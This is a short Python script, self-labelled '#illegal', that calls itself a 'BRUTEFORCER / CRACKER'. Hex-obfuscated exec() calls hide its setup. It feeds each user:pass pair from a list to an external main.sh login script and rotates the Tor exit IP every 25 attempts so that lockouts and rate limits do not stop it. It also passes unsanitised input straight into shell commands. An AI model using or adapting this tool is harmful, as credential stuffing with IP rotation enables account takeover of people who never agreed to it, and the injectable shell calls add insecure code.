#illegal
exec('\x69\x6d\x70\x6f\x72\x74\x20\x6f\x73')
exec('\x6b\x6b\x3d\x22\x73\x65\x63\x75\x72\x69\x74\x79\x2d\x73\x6f\x66\x74\x77\x61\x72\x65\x73\x22')
exec('\x63\x6f\x6c\x6f\x72\x3d\x22\x5c\x30\x33\x33\x5b\x33\x31\x6d\x22')
exec('\x67\x3d\x22\x5c\x30\x33\x33\x5b\x31\x3b\x33\x32\x6d\x22')
exec('\x79\x3d\x22\x5c\x30\x33\x33\x5b\x33\x38\x3b\x35\x3b\x32\x32\x36\x6d\x22')
print(f'''{g}
####################################################
##     {y}   BRUTEFORCER / CRACKER                {g}   ##
##       {color} Made in latest technology   {g}            ##
##            Made by {kk}         {g} ##
##                                                ##
##                                                ##
####################################################
''')
if kk!='\x73\x65\x63\x75\x72\x69\x74\x79\x2d\x73\x6f\x66\x74\x77\x61\x72\x65\x73':
    exit()
i=input(f'{g} Enter \033[31m user:pass \033[0mfile : ')
os.system(f"sed -i '/^[[:space:]]*$/d'  {i} ")
if i.isspace==True or i=='':
    print('error \n no file provided')
    exit()
f=open(i,'r')
o=os.geteuid()
if o!=0:
    print(f'{color}Error run with sudo !!')
    exit()



def ip():
    a=os.system('kalitorify -r >>/dev/null ')
    if a==0:
        return 'k'
    else:
        ip()
c=0

kkk=f.readlines()
for k in kkk:
    if c==25:
        c=0
        ip()
        
    m=k.split(':')
    u,passwd=m[0],m[1]
    
    
    os.system(f'bash main.sh {u} {passwd}')
    c+=1
    os.system("rm -rf cookie.*")


f.close()
os.system('kalitorify -c')
